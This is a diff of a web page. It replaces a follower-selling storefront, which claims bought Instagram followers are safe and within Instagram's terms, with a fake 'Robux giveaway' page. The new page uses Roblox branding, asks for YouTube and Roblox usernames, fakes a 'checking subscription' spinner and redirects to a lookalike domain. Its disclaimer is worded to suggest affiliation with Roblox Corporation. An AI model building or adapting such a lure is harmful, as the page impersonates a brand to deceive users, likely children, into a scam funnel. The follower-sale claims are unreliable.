@@ -3,864 +3,294 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>InstaBoost Pro | Premium Instagram Followers</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Official Robux Giveaway - Limited Time Offer</title>
     <style>
-        :root {
-            --primary: #FF007A; /* Vibrant pink */
-            --primary-light: #FF66B2;
-            --secondary: #7928CA; /* Deep purple */
-            --tertiary: #00B4FF; /* Bright blue */
-            --accent: #FFD700; /* Gold */
-            --dark: #121212;
-            --darker: #6c0754;
-            --light: #FFFFFF;
-            --light-gray: #F5F5F7;
-            --success: #00E676;
-            --info: #00B0FF;
-            --warning: #FFAB00;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
-        
-        body {
-            background-color: var(--darker);
-            color: var(--light);
-            line-height: 1.7;
-        }
-        
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        margin: 0;
+        padding: 0;
+        color: #222;
+        background-image: url('https://static.lagofast.com/blog/cover/1727147016286724.jpg');
+        background-size: cover;
+        background-position: center;
+        background-attachment: fixed;
+    }
+
+    .overlay {
+        background-color: rgba(0, 0, 0, 0.75);
+        min-height: 100vh;
+        padding: 30px 15px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .container {
+        max-width: 500px;
+        background: #fff;
+        border-radius: 15px;
+        padding: 35px 30px;
+        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
+        animation: fadeIn 0.6s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(30px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    .logo {
+        text-align: center;
+        margin-bottom: 20px;
+    }
+
+    .logo img {
+        height: 70px;
+    }
+
+    .offer-card {
+        text-align: center;
+    }
+
+    .offer-title {
+        font-size: 26px;
+        color: #e60012;
+        font-weight: 800;
+        margin-bottom: 10px;
+    }
+
+    .robux-amount {
+        font-size: 40px;
+        font-weight: bold;
+        color: #d52deb;
+        margin: 20px 0;
+        background: linear-gradient(to right, #ffe9e9, #ffe3e3);
+        padding: 12px 20px;
+        border-radius: 8px;
+        display: inline-block;
+        box-shadow: inset 0 1px 5px rgba(0, 0, 0, 0.05);
+    }
+
+    .benefits {
+        text-align: left;
+        margin: 25px 0;
+        font-size: 15px;
+    }
+
+    .benefit-item {
+        position: relative;
+        padding-left: 28px;
+        margin-bottom: 12px;
+    }
+
+    .benefit-item::before {
+        content: "✓";
+        position: absolute;
+        left: 0;
+        top: 1px;
+        color: #4CAF50;
+        font-weight: bold;
+    }
+
+    input {
+        width: 100%;
+        padding: 14px;
+        margin: 10px 0;
+        font-size: 16px;
+        border-radius: 6px;
+        border: 1px solid #ccc;
+        transition: border-color 0.3s;
+    }
+
+    input:focus {
+        border-color: #4CAF50;
+        outline: none;
+    }
+
+    .cta-button {
+        display: inline-block;
+        width: 100%;
+        padding: 16px;
+        font-size: 18px;
+        background: linear-gradient(to right, #7b029c, #45A049);
+        color: #fff;
+        border: none;
+        border-radius: 6px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: background 0.3s ease-in-out;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .cta-button:hover {
+        background: linear-gradient(to right, #2a034d, #388e3c);
+    }
+
+    .loading {
+        display: none;
+        text-align: center;
+        margin-top: 20px;
+    }
+
+    .spinner {
+        width: 32px;
+        height: 32px;
+        border: 4px solid rgba(0,0,0,0.1);
+        border-top: 4px solid #e60012;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 10px;
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    .timer {
+        background-color: #f7f7f7;
+        border: 1px solid #ddd;
+        padding: 15px;
+        border-radius: 10px;
+        margin: 25px 0;
+        text-align: center;
+    }
+
+    .timer-title {
+        font-weight: 600;
+        font-size: 16px;
+        margin-bottom: 8px;
+    }
+
+    #countdown {
+        font-size: 24px;
+        color: #e60012;
+        font-weight: bold;
+        letter-spacing: 1px;
+    }
+
+    .disclaimer {
+        font-size: 14px;
+        background-color: #fff8e1;
+        padding: 15px;
+        border-left: 5px solid #ffc107;
+        border-radius: 10px;
+        margin-top: 20px;
+        text-align: center;
+    }
+
+    .verified-badge {
+        text-align: center;
+        color: #4CAF50;
+        font-weight: bold;
+        margin-top: 10px;
+        font-size: 15px;
+    }
+
+    @media (max-width: 600px) {
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        header {
-            background: linear-gradient(135deg, var(--secondary), var(--primary));
-            color: white;
-            padding: 30px 0;
-            text-align: center;
-            border-radius: 0 0 30px 30px;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
-            margin-bottom: 50px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        header::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
-            transform: rotate(30deg);
-            z-index: 1;
-        }
-        
-        .logo {
-            font-size: 3rem;
-            font-weight: 700;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            z-index: 2;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-        }
-        
-        .logo i {
-            margin-right: 20px;
-            filter: drop-shadow(0 2px 5px rgba(0, 0, 0, 0.3));
-        }
-        
-        .tagline {
-            font-size: 1.3rem;
-            opacity: 0.95;
-            margin-bottom: 25px;
-            position: relative;
-            z-index: 2;
-            font-weight: 300;
-        }
-        
-        .hero {
-            text-align: center;
-            margin-bottom: 60px;
-        }
-        
-        .hero h1 {
-            font-size: 3.2rem;
-            margin-bottom: 25px;
-            background: linear-gradient(to right, var(--primary), var(--accent));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            line-height: 1.2;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-        }
-        
-        .hero p {
-            font-size: 1.3rem;
-            max-width: 800px;
-            margin: 0 auto 40px;
-            color: rgba(255,255,255,0.8);
-        }
-        
-        .price-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 30px;
-            margin-bottom: 70px;
-        }
-        
-        .price-card {
-            background: linear-gradient(145deg, #1E1E1E, #252525);
-            border-radius: 20px;
-            padding: 35px;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            position: relative;
-            overflow: hidden;
-            border: 1px solid rgba(255,255,255,0.05);
-            z-index: 1;
-        }
-        
-        .price-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(255,0,122,0.1) 0%, rgba(121,40,202,0.1) 100%);
-            z-index: -1;
-        }
-        
-        .price-card:hover {
-            transform: translateY(-15px) scale(1.02);
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
-            border: 1px solid rgba(255,0,122,0.3);
-        }
-        
-        .price-card::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 5px;
-            background: linear-gradient(to right, var(--primary), var(--secondary));
-        }
-        
-        .card-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 25px;
-        }
-        
-        .card-header i {
-            font-size: 2.8rem;
-            margin-right: 20px;
-            background: linear-gradient(to right, var(--primary), var(--accent));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            filter: drop-shadow(0 2px 5px rgba(0, 0, 0, 0.3));
-        }
-        
-        .card-header h3 {
-            font-size: 1.6rem;
-            background: linear-gradient(to right, var(--primary-light), var(--light));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        
-        .price {
-            font-size: 2.8rem;
-            font-weight: 700;
-            margin: 25px 0;
-            color: var(--accent);
-            display: flex;
-            align-items: flex-start;
-        }
-        
-        .price span {
-            font-size: 1.1rem;
-            opacity: 0.8;
-            margin-left: 5px;
-            margin-top: 10px;
-        }
-        
-        .features {
-            list-style: none;
-            margin-bottom: 35px;
-        }
-        
-        .features li {
-            margin-bottom: 12px;
-            position: relative;
-            padding-left: 30px;
-            color: rgba(255,255,255,0.85);
-        }
-        
-        .features li::before {
-            content: '✓';
-            position: absolute;
-            left: 0;
-            color: var(--success);
-            font-weight: bold;
-            font-size: 1.2rem;
-        }
-        
-        .btn-group {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-        
-        .btn {
-            display: inline-block;
-            padding: 15px 30px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: 600;
-            text-align: center;
-            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-            border: none;
-            cursor: pointer;
-            font-size: 1.1rem;
-            letter-spacing: 0.5px;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(to right, var(--primary), var(--secondary));
-            color: white;
-            box-shadow: 0 5px 20px rgba(255, 0, 122, 0.4);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .btn-primary::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(to right, transparent, rgba(255,255,255,0.2), transparent);
-            transition: all 0.6s;
-        }
-        
-        .btn-primary:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(255, 0, 122, 0.6);
-        }
-        
-        .btn-primary:hover::before {
-            left: 100%;
-        }
-        
-        .btn-secondary {
-            background: rgba(255,255,255,0.1);
-            color: var(--light);
-            border: 1px solid rgba(255,255,255,0.2);
-            backdrop-filter: blur(5px);
-        }
-        
-        .btn-secondary:hover {
-            background: rgba(255,255,255,0.2);
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-        
-        .benefits {
-            background: linear-gradient(145deg, #1A1A1A, #222222);
-            border-radius: 25px;
-            padding: 50px;
-            margin-bottom: 70px;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
-            border: 1px solid rgba(255,255,255,0.05);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .benefits::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(0,180,255,0.05) 0%, rgba(0,180,255,0) 70%);
-            z-index: 0;
-        }
-        
-        .benefits h2 {
-            text-align: center;
-            margin-bottom: 50px;
-            font-size: 2.5rem;
-            background: linear-gradient(to right, var(--primary), var(--tertiary));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .benefit-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 35px;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .benefit-card {
-            text-align: center;
-            padding: 30px 25px;
-            border-radius: 15px;
-            transition: all 0.4s;
-            background: rgba(30,30,30,0.7);
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-        
-        .benefit-card:hover {
-            background: rgba(40,40,40,0.7);
-            transform: translateY(-10px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255,0,122,0.3);
-        }
-        
-        .benefit-card i {
-            font-size: 3rem;
-            margin-bottom: 20px;
-            background: linear-gradient(to right, var(--primary), var(--tertiary));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        
-        .benefit-card h3 {
-            margin-bottom: 15px;
-            color: var(--light);
-            font-size: 1.4rem;
-        }
-        
-        .benefit-card p {
-            color: rgba(255,255,255,0.7);
-            font-size: 1.1rem;
-        }
-        
-        .faq {
-            margin-bottom: 70px;
-        }
-        
-        .faq h2 {
-            text-align: center;
-            margin-bottom: 50px;
-            font-size: 2.5rem;
-            background: linear-gradient(to right, var(--primary), var(--tertiary));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        
-        .faq-item {
-            background: linear-gradient(145deg, #1E1E1E, #252525);
-            border-radius: 15px;
-            margin-bottom: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            overflow: hidden;
-            border: 1px solid rgba(255,255,255,0.05);
-            transition: all 0.3s;
-        }
-        
-        .faq-item:hover {
-            border: 1px solid rgba(255,0,122,0.3);
-        }
-        
-        .faq-question {
-            padding: 25px;
-            background: rgba(255,255,255,0.03);
-            font-weight: 600;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 1.2rem;
-            transition: all 0.3s;
-        }
-        
-        .faq-question:hover {
-            background: rgba(255,255,255,0.05);
-        }
-        
-        .faq-question i {
-            transition: all 0.3s;
-        }
-        
-        .faq-answer {
-            padding: 0 25px;
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.4s ease-out, padding 0.4s ease;
-            color: rgba(255,255,255,0.8);
-        }
-        
-        .faq-item.active .faq-answer {
-            padding: 0 25px 25px;
-            max-height: 500px;
-        }
-        
-        .faq-item.active .faq-question {
-            color: var(--primary-light);
+            padding: 25px 20px;
         }
 
+        .robux-amount {
+            font-size: 32px;
+        }
 
-         .button2 {
-      display: inline-block;
-      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-      color: #fff;
-      text-decoration: none;
-      font-size: 16px;
-      font-weight: bold;
-      padding: 14px 24px;
-      border-radius: 30px;
-      transition: background 0.3s ease, transform 0.2s ease;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        .cta-button {
+            font-size: 16px;
+            padding: 14px;
+        }
     }
+</style>
 
-    .button2:hover {
-      background: linear-gradient(135deg, #2575fc 0%, #6a11cb 100%);
-      transform: scale(1.05);
-    }
-        
-        footer {
-            text-align: center;
-            padding: 50px 0;
-            background: linear-gradient(to right, #0A0A0A, #121212);
-            color: white;
-            border-radius: 30px 30px 0 0;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        footer::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 20% 50%, rgba(255,0,122,0.05) 0%, rgba(255,0,122,0) 50%);
-        }
-        
-        .footer-logo {
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .footer-logo i {
-            margin-right: 15px;
-            background: linear-gradient(to right, var(--primary), var(--tertiary));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        
-        .footer-tagline {
-            font-size: 1.2rem;
-            opacity: 0.8;
-            margin-bottom: 30px;
-            position: relative;
-            z-index: 1;
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        
-        .social-links {
-            margin: 30px 0;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .social-links a {
-            color: white;
-            margin: 0 15px;
-            font-size: 1.8rem;
-            transition: all 0.3s;
-            display: inline-block;
-        }
-        
-        .social-links a:hover {
-            color: var(--primary-light);
-            transform: translateY(-5px);
-        }
-        
-        .copyright {
-            opacity: 0.7;
-            font-size: 0.9rem;
-            position: relative;
-            z-index: 1;
-        }
-        
-        /* Floating animation */
-        @keyframes float {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-15px); }
-            100% { transform: translateY(0px); }
-        }
-        
-        .floating {
-            animation: float 6s ease-in-out infinite;
-        }
-        
-        /* Animation classes */
-        @keyframes fadeInUp {
-            from { 
-                opacity: 0; 
-                transform: translateY(40px); 
-            }
-            to { 
-                opacity: 1; 
-                transform: translateY(0); 
-            }
-        }
-        
-        .animate {
-            opacity: 0;
-            animation: fadeInUp 0.8s ease-out forwards;
-        }
-        
-        .delay-1 { animation-delay: 0.2s; }
-        .delay-2 { animation-delay: 0.4s; }
-        .delay-3 { animation-delay: 0.6s; }
-        .delay-4 { animation-delay: 0.8s; }
-        
-        /* Glow effect */
-        .glow {
-            text-shadow: 0 0 10px rgba(255, 0, 122, 0.7);
-        }
-        
-        @media (max-width: 768px) {
-            .hero h1 {
-                font-size: 2.5rem;
-            }
-            
-            .price-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .benefits {
-                padding: 30px 20px;
-            }
-            
-            .benefit-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .price-card {
-                padding: 25px;
-            }
-
-
-        }
-    </style>
 </head>
 <body>
-    <header>
+    <div class="overlay">
         <div class="container">
-            <div class="logo floating">
-                <i class="fab fa-instagram"></i>
-                <span>Instagram Boost Pro</span>
-            </div>
-            <p class="tagline">Get a Free Test – Claim It Here Before You Pay! Try Our Service First.</p>
-            <a href="https://wa.me/31637630250" class="button2">Want free trial? Scroll down and test our service for free</a>
-            
-        </div>
-    </header>
-    
-    <main class="container">
-        <section class="hero">
-            <h1 class="glow">Boost Your Instagram Presence Today</h1>
-            <p>Get high-quality followers starting at just $2.99. Boost your social presence and become an influencer today!</p>
-        </section>
-        
-        <section class="price-grid">
-            <div class="price-card animate">
-                <div class="card-header">
-                    <i class="fab fa-instagram"></i>
-                    <h3>Instagram Followers</h3>
-                </div>
-                <div class="price">$2.99 <span>/ 1,000 followers</span></div>
-                <ul class="features">
-                    <li>High-quality followers</li>
-                    <li>Instant delivery</li>
-                    <li>24/7 support</li>
-                    <li>30-day guarantee</li>
-                </ul>
-                <div class="btn-group">
-                    <a href="https://www.paypal.com/ncp/payment/9ULFVNRTZA2QG" class="btn btn-primary">Buy Now</a>
-                    <a href="https://wa.me/31637630250" class="btn btn-secondary">For free Test? Send ur username here</a>
-                </div>
+            <div class="logo">
+                <img src="https://i.postimg.cc/V6wmz2wv/roblox-rdc2024-everythingannounced-blogroll-1725644096329-removebg-preview.png" alt="Roblox Logo">
             </div>
             
-            <div class="price-card animate delay-1">
-                <div class="card-header">
-                    <i class="fab fa-instagram"></i>
-                    <h3>Instagram Followers</h3>
-                </div>
-                <div class="price">$4.99 <span>/ 2,000 followers</span></div>
-                <ul class="features">
-                    <li>High-quality followers</li>
-                    <li>Instant delivery</li>
-                    <li>24/7 support</li>
-                    <li>30-day guarantee</li>
-                </ul>
-                <div class="btn-group">
-                    <a href="https://www.paypal.com/ncp/payment/7M8EZNY8MQ9M2" class="btn btn-primary">Buy Now</a>
-                    <a href="https://wa.me/31637630250" class="btn btn-secondary">For free Test? Send ur username here</a>
-                </div>
-            </div>
-            
-            <div class="price-card animate delay-2">
-                <div class="card-header">
-                    <i class="fab fa-instagram"></i>
-                    <h3>Instagram Followers</h3>
-                </div>
-                <div class="price">$9.99 <span>/ 5,000 followers</span></div>
-                <ul class="features">
-                    <li>High-quality followers</li>
-                    <li>Instant delivery</li>
-                    <li>24/7 support</li>
-                    <li>30-day guarantee</li>
-                </ul>
-                <div class="btn-group">
-                    <a href="https://www.paypal.com/ncp/payment/MHVDM3WM7UY7J" class="btn btn-primary">Buy Now</a>
-                    <a href="https://wa.me/31637630250" class="btn btn-secondary">For free Test? Send ur username here</a>
-                </div>
-            </div>
-            
-            <div class="price-card animate delay-3">
-                <div class="card-header">
-                    <i class="fab fa-instagram"></i>
-                    <h3>Instagram Followers</h3>
-                </div>
-                <div class="price">$13.99 <span>/ 7,000 followers</span></div>
-                <ul class="features">
-                    <li>High-quality followers</li>
-                    <li>Instant delivery</li>
-                    <li>24/7 support</li>
-                    <li>30-day guarantee</li>
-                </ul>
-                <div class="btn-group">
-                    <a href="https://www.paypal.com/ncp/payment/2TCYKDR57LH64" class="btn btn-primary">Buy Now</a>
-                    <a href="https://wa.me/31637630250" class="btn btn-secondary">For free Test? Send ur username here</a>
-                </div>
-            </div>
-            
-            <div class="price-card animate delay-1">
-                <div class="card-header">
-                    <i class="fab fa-instagram"></i>
-                    <h3>Instagram Followers</h3>
-                </div>
-                <div class="price">$17.99 <span>/ 9,000 followers</span></div>
-                <ul class="features">
-                    <li>High-quality followers</li>
-                    <li>Instant delivery</li>
-                    <li>24/7 support</li>
-                    <li>30-day guarantee</li>
-                </ul>
-                <div class="btn-group">
-                    <a href="https://www.paypal.com/ncp/payment/GY9HBFZ6PDLXQ" class="btn btn-primary">Buy Now</a>
-                    <a href="https://wa.me/31637630250" class="btn btn-secondary">For free Test? Send ur username here</a>
-                </div>
-            </div>
-            
-            <div class="price-card animate delay-2">
-                <div class="card-header">
-                    <i class="fab fa-instagram"></i>
-                    <h3>Instagram Followers</h3>
-                </div>
-                <div class="price">$18.99 <span>/ 10,000 followers</span></div>
-                <ul class="features">
-                    <li>High-quality followers</li>
-                    <li>Instant delivery</li>
-                    <li>24/7 support</li>
-                    <li>30-day guarantee</li>
-                </ul>
-                <div class="btn-group">
-                    <a href="https://www.paypal.com/ncp/payment/FWU3ETPSFS2HW" class="btn btn-primary">Buy Now</a>
-                    <a href="https://wa.me/31637630250" class="btn btn-secondary">For free Test? Send ur username here</a>
-                </div>
-            </div>
-        </section>
-        
-        <section class="benefits">
-            <h2>Why Choose Us?</h2>
-            <div class="benefit-grid">
-                <div class="benefit-card">
-                    <i class="fas fa-bolt"></i>
-                    <h3>Instant Delivery</h3>
-                    <p>Your followers start arriving within minutes after purchase. No waiting!</p>
-                </div>
-                <div class="benefit-card">
-                    <i class="fas fa-shield-alt"></i>
-                    <h3>100% Safe</h3>
-                    <p>Our methods are completely safe and won't get your account banned.</p>
-                </div>
-                <div class="benefit-card">
-                    <i class="fas fa-users"></i>
-                    <h3>High Quality Followers</h3>
-                    <p>We deliver high quality followers.</p>
-                </div>
-                <div class="benefit-card">
-                    <i class="fas fa-headset"></i>
-                    <h3>24/7 Support</h3>
-                    <p>Our customer support team is available around the clock to help you.</p>
-                </div>
-                <div class="benefit-card">
-                    <i class="fas fa-lock"></i>
-                    <h3>Secure Payment</h3>
-                    <p>All payments are processed securely with encryption.</p>
-                </div>
-                <div class="benefit-card">
-                    <i class="fas fa-hand-holding-usd"></i>
-                    <h3>Money Back Guarantee</h3>
-                    <p>Not satisfied? We offer a 30-day money back guarantee.</p>
-                </div>
-            </div>
-        </section>
-        
-        <section class="faq">
-            <h2>Frequently Asked Questions</h2>
-            <div class="faq-item">
-                <div class="faq-question">
-                    <span>How quickly will I receive my followers?</span>
-                    <i class="fas fa-plus"></i>
-                </div>
-                <div class="faq-answer">
-                    <p>Delivery starts immediately after purchase and completes within 24-48 minutes depending on the package size.</p>
-                </div>
-            </div>
-            <!-- <div class="faq-item">
-                <div class="faq-question">
-                    <span>Are these real followers?</span>
-                    <i class="fas fa-plus"></i>
-                </div>
-                <div class="faq-answer">
-                    <p>Yes! We provide only real, active Instagram followers - no bots or fake accounts.</p>
-                </div>
-            </div> -->
-            <div class="faq-item">
-                <div class="faq-question">
-                    <span>Is this service safe for my account?</span>
-                    <i class="fas fa-plus"></i>
-                </div>
-                <div class="faq-answer">
-                    <p>Absolutely. Our methods are completely safe and comply with Instagram's terms of service.</p>
-                </div>
-            </div>
-            <div class="faq-item">
-                <div class="faq-question">
-                    <span>What payment methods do you accept?</span>
-                    <i class="fas fa-plus"></i>
-                </div>
-                <div class="faq-answer">
-                    <p>We accept all major credit cards and PayPal for secure payments.</p>
-                </div>
-            </div>
-            <div class="faq-item">
-                <div class="faq-question">
-                    <span>Do you offer refunds?</span>
-                    <i class="fas fa-plus"></i>
-                </div>
-                <div class="faq-answer">
-                    <p>Yes, we offer a 30-day money back guarantee if you're not satisfied with our service.</p>
-                </div>
-            </div>
-        </section>
-    </main>
-    
-    <footer>
-        <div class="container">
-            <div class="footer-logo">
-                <!-- <i class="fab fa-instagram"></i> -->
-                <span>Anezom Boost Pro</span>
-            </div>
-            <p class="footer-tagline">Boost your social media presence with high-quality followers.</p>
-            <div class="social-links">
-                <a href="https://www.instagram.com/anezom.1/"><i class="fab fa-instagram"></i></a>
-                <a href="https://wa.me/31637630250"><i class="fab fa-whatsapp"></i></a>
-                <!-- <a href="#"><i class="fab fa-twitter"></i></a>
-                <a href="#"><i class="fab fa-facebook"></i></a> -->
-            </div>
-            <p class="copyright">&copy; 2020 - 2025 Anezom Pro. All rights reserved.</p>
-        </div>
-    </footer>
-    
-    <script>
-        // FAQ toggle functionality
-        document.querySelectorAll('.faq-question').forEach(question => {
-            question.addEventListener('click', () => {
-                const item = question.parentElement;
-                item.classList.toggle('active');
+            <div class="offer-card">
+                <h1 class="offer-title">Special Promotion for My Subscribers</h1>
+                <p>Verify your subscription to claim your Robux</p>
                 
-                // Toggle icon
-                const icon = question.querySelector('i');
-                if (item.classList.contains('active')) {
-                    icon.classList.remove('fa-plus');
-                    icon.classList.add('fa-minus');
-                } else {
-                    icon.classList.remove('fa-minus');
-                    icon.classList.add('fa-plus');
-                }
-            });
-        });
-        
-        // Animation on scroll
-        const animateElements = document.querySelectorAll('.animate');
-        
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('animated');
-                }
-            });
-        }, { threshold: 0.1 });
-        
-        animateElements.forEach(element => {
-            observer.observe(element);
-        });
-        
-        // Add floating animation to price cards on hover
-        document.querySelectorAll('.price-card').forEach(card => {
-            card.addEventListener('mouseenter', () => {
-                card.classList.add('floating');
-            });
+                <div class="robux-amount">2000 ROBUX</div>
+                
+                <div class="benefits">
+                    <div class="benefit-item">You must be subscribed to our YouTube channel</div>
+                    <div class="benefit-item">No password required - 100% secure</div>
+                    <div class="benefit-item">Instant delivery after verification</div>
+                </div>
+                
+                <input type="text" id="youtubeUsername" placeholder="Enter Your YouTube Username">
+                <input type="text" id="robloxUsername" placeholder="Enter Your Roblox Username">
+                
+                <button id="generateBtn" class="cta-button">VERIFY & GENERATE ROBUX</button>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Checking your subscription status...</p>
+                </div>
+                
+                <!-- <div class="timer">
+                    <div class="timer-title">OFFER EXPIRES IN:</div>
+                    <div id="countdown">23:59:59</div>
+                </div> -->
+            </div>
             
-            card.addEventListener('mouseleave', () => {
-                card.classList.remove('floating');
-            });
-        });
+            <div class="disclaimer">
+                <strong>Note:</strong> This is a promotional Giveaway offer for our YouTube subscribers only. affiliated with Roblox Corporation. Limited to one claim per user.
+            </div>
+            
+            <p class="verified-badge" style="color: black;"><a href="https://www.roblox.com/">© 2025 Roblox Corporation</a>. All rights reserved. <a href="https://www.career-maestros.com">Career-Maestros</a> Official Partner Giveaway.</p>
+        </div>
+    </div>
+
+    <script>
+        // Countdown timer
+        function updateCountdown() {
+            const now = new Date();
+            const midnight = new Date();
+            midnight.setHours(24, 0, 0, 0);
+            
+            const diff = midnight - now;
+            
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+            
+            document.getElementById('countdown').textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // Generate Robux function
+        function generateRobux() {
+            const youtubeUsername = document.getElementById("youtubeUsername").value;
+            const robloxUsername = document.getElementById("robloxUsername").value;
+            
+            if (!youtubeUsername || !robloxUsername) {
+                alert("Please enter both your YouTube and Roblox usernames to continue.");
+                return;
+            }
+            
+            // Show loading state
+            document.getElementById("generateBtn").style.display = "none";
+            document.getElementById("loading").style.display = "block";
+            
+            // Simulate verification for 3 seconds
+            setTimeout(function() {
+                // Redirect to the offer page
+                window.location.href = "https://rublnox-abdessamads-projects-0f41d1c1.vercel.app/";
+            }, 3000);
+        }
+        
+        // Initialize everything when page loads
+        window.onload = function() {
+            setInterval(updateCountdown, 1000);
+            updateCountdown();
+            
+            document.getElementById("generateBtn").addEventListener("click", generateRobux);
+        };
     </script>
 </body>
 </html>
